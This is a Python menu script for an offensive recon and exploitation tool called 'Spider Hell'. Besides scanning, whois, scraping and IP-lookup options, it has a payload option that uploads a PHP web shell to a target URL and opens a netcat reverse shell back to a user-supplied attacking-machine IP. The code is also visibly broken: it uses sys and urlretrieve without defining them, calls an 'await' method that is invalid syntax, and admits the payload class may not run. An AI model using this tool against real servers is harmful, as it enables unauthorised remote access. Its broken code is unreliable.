from time import sleep
from exploits import NetworkIntelligence
from exploits import ScraperInfo
from exploits import IPLookUp
from exploits import PayLoads
from exploits import Ping
from Webcrawler import WebCrawler
from prettytable import PrettyTable


TAB = "\t" * 2
header = """

\t\t\t███████╗██████╗ ██╗██████╗ ███████╗██████╗
\t\t\t██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
\t\t\t███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝
\t\t\t╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗
\t\t\t███████║██║     ██║██████╔╝███████╗██║  ██║
\t\t\t╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

"""
header1 = """
   ▄█    █▄       ▄████████  ▄█        ▄█
  ███    ███    ███    ███  ███       ███
  ███    ███    ███    █▀   ███       ███
 ▄███▄▄▄▄███▄▄ ▄███▄▄▄      ███       ███
▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███
  ███    ███     ███    █▄  ███       ███
  ███    ███     ███    ███ ███▌    ▄ ███     ▄
  ███    █▀      ██████████ █████▄▄██ █████▄▄██
"""

colors = {
    'BLUE': '\33[1;94m',
    'RED': '\033[1;91m',
    'WHITE': '\33[1;97m',
    'YELLOW': '\33[1;93m',
    'MAGENTA': '\033[1;35m',
    'GREEN': '\033[1;32m',
    'END': '\033[0m',
}

print(colors["YELLOW"], """
    Developer: Given Lepita
    Version: 0.0.1
    Project: Recon, OSINT, Scanning And Exploitation Tool
    """, colors["END"])


def main():
    print(colors["RED"], TAB, header1, colors["END"], colors["BLUE"], header, colors["END"])
    table = PrettyTable()
    table.field_names = [
        "1 - Network Intelligence", "2 - Scraping",
        "3 - IP Lookup", "4 - Payloads", "5 - Ping"
    ]
    options = ["""
[+] NMAP Scans
[+] Robots.txt
[+] Whois information
    """, """
[+] Source Code & HTTP(S) headers
[+] Harvesting Comments
[+] Links(Download Images)
    """,
    """
[+] IP information(TABLE FORMAT)
[+] Region , Coordiates and MORE!
    """,
    """
[+] NetCat Shell (Remote Exploitation)
[+] Panel Shell Exploit
[+] FTP Exploit!
    """, "[+] Ping Host"]
    table.add_row(
        [
        options[0], options[1], options[2], options[3], options[4]
        ]
    )
    table.align = "l"
    print(colors["MAGENTA"], table, colors["END"])
    baseClass = int(input("Choose option:  "))

    if baseClass == 1:
        newAgent = input("Enter URL to perfom Network Intelligence on:   ")
        baseObject = NetworkIntelligence(newAgent)

        print("Perfoming Network Intelligence On {}".format(newAgent))
        sleep(0.8)
        baseObject.network_mapper()
        baseObject.robotsFile()
        baseObject.whoIs()

    elif baseClass == 2:
        newAgent = input("Enter URL to perfom Scraping on:   ")
        baseObject = ScraperInfo(newAgent)

        print("CAUTION: Make Sure You Have A Lot Of Bandwith And A Strong Signal")
        sleep(0.8)
        print("\nPerforming  Web Scraping On {}".format(newAgent))
        sleep(0.2)
        baseObject.HTTP_headers()
        baseObject.sourceCode()
        baseObject.HTTP_headers()
        baseObject.siteImages()

    elif baseClass == 3:
        newAgent = input("Enter IP Address:   ")
        baseObject = IPLookUp(newAgent)

        try:
            sleep(0.4)
            print("Extracting information about {} from Freegeoip.net".format(newAgent))
            baseObject.getInformation()
        except Exception as e:
            print("Error ", e)
    # PAYLOAD class has some bugs
    # No gaurantee it will run
    # I'll fix it when I have time.
    elif baseClass == 4:
        urlUpload ="http://torct.whatever/upload.php"
        port = input("Enter PORT(default[4444]):   ")
        url = input("Enter URL:   ")
        shellDir = input("Input shell(/shell/shell.php):  ")
        ipAddr = input("Enter IP Address(Attacking Machine):   ")
        try:
            if shellDir == "":
                baseObject = PayLoads(url, ipAddr)
                baseObject.upload_shell(urlUpload)
            elif shellDir == "Exit" or shellDir == "exit":
                sys.exit()
            else:
                baseObject = PayLoads(url, ipAddr)
                baseObject.upload_shell(urlretrieve, shellDir)
                if port == "":
                    sock = baseObject.construction()
                    baseObject.await(sock)
                    baseObject.run()
                elif port != None:
                    sock = baseObject.construction()
                    # baseObject.await(sock)
                    baseObject.run()

        except Exception as e:
            print("Error ", e)
    elif baseClass == 5:
        try:
            ip = input("Enter IP address to ping:  ")
            baseObject = Ping(ip)
            baseObject.pingScan()
        except Exception as e:
            print("Error ", e)

    else:
        default = "https://google.com/index.html"
        baseObject = WebCrawler(default)
        baseObject.get_absolute_url()


if __name__ == "__main__":
    main()